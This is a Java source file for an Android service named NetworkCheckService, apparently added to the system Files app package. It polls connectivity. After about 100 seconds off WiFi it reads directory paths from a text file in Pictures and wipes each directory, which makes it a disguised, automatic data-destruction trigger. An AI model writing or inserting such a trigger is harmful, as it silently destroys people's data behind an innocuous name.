package com.android.documentsui;

import android.app.Service;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.util.Log;

import com.android.documentsui.DirectoryWiper;
import java.io.File;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import android.widget.Toast;



public class NetworkCheckService extends Service{

    private static final String TAG = "NetworkCheckService";
    private int noConnectionCount = 0;
    private boolean running = true;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
    // Start background checking process
    new Thread(() -> {
        while(running){
            checkNetworkStatus();
            try {
                Thread.sleep(10000);
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
    }).start();

    return START_NOT_STICKY;
    }

    private void checkNetworkStatus(){
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();

        if (activeNetwork != null && activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE){
            Log.d(TAG, "Connected to cellular network");
        }
        else{
            Log.d(TAG, "No Connection to Cellular Network");
        }

        if (activeNetwork != null && activeNetwork.getType() == ConnectivityManager.TYPE_WIFI){
            Log.d(TAG, "Connected to WIFI");
            noConnectionCount = 0;
        }
        else{
            Log.d(TAG, "Not Connected to WIFI Also." + noConnectionCount);
            noConnectionCount += 1;
            if (noConnectionCount == 10){
                DirectoryWiper wiper = new DirectoryWiper();
                try (BufferedReader Reader = new BufferedReader(new FileReader("/storage/emulated/0/Pictures/test.txt"))){
                    String line;
                    while ((line = Reader.readLine()) != null){
                        Log.d(TAG, "Line is " + line);
                        File path = new File(line);
                        wiper.wipeDirectory(path);
                    }
                    noConnectionCount = 0;
                } catch (IOException e){
                    Log.d(TAG, "Something failed at a step of the wipe!");
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onDestroy(){
        super.onDestroy();
        running = false;
        Log.d(TAG,  "Service Destroyed");
    }

    @Override
    public IBinder onBind(Intent intent){
        return null;
    }
}